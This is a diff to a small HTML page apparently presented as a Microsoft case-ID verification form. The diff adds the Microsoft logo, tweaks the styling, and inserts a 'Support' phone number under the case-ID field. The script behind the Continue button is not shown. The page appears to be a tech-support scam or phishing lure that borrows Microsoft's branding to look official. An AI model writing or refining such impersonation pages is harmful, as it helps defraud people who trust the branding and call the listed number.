@@ -7,11 +7,11 @@
       font-family: Arial, sans-serif;
       background-color: #f2f2f2;
       text-align: center;
-      padding-top: 100px;
+      padding-top: 80px;
     }
     .container {
       background-color: white;
-      padding: 30px;
+      padding: 40px;
       border-radius: 10px;
       display: inline-block;
       box-shadow: 0 0 10px rgba(0,0,0,0.2);
@@ -22,14 +22,27 @@
       width: 250px;
       margin: 10px 0;
     }
+    img.logo {
+      width: 180px;
+      margin-bottom: 30px;
+    }
+    .support {
+      margin-top: 30px;
+      font-size: 14px;
+      color: #333;
+    }
   </style>
 </head>
 <body>
   <div class="container">
-    <h2>Microsoft Case ID Verification</h2>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft Logo" class="logo">
+    <h2>Case ID Verification</h2>
     <input type="text" id="caseId" placeholder="Enter Case ID">
     <br>
     <button onclick="verifyCase()">Continue</button>
+    <div class="support">
+      Support: +1 206 279 9715
+    </div>
   </div>
 
   <script>
